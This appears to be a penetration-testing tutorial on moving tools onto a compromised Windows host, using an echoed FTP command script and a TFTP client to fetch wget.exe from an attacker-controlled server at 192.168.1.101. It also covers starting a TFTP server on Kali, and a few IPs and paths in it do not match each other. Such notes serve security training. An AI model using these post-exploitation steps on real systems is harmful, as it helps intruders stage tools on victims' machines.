# Transferring files to windows

Transferring files to linux is usually pretty easy. We can use netcat, wget, curl, which most systems have as default. But windows does not have these tools.



## FTP

Most windows machines have a ftp-client included. But we can't use it interactively since that most  likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.

On the compromised machine we echo out the following commands into a file

```
echo open 192.168.1.101 21> ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
```

Then run this command to connect to the ftp

```
ftp –v -n -s:ftp.txt
```

Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.

## TFTP

A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactivly. Which means less risk of losing your shell.

Kali has a TFTP server build in.
You can server up some files with it like this

```
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```

Now you can put stuff in /srf/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. 

You can see it running like this

```
netstat -a -p UDP | grep udp
```

So now you can upload and download whatever from the windows-machine like this

```
tftp -i 192.160.1.101 GET wget.exe
```
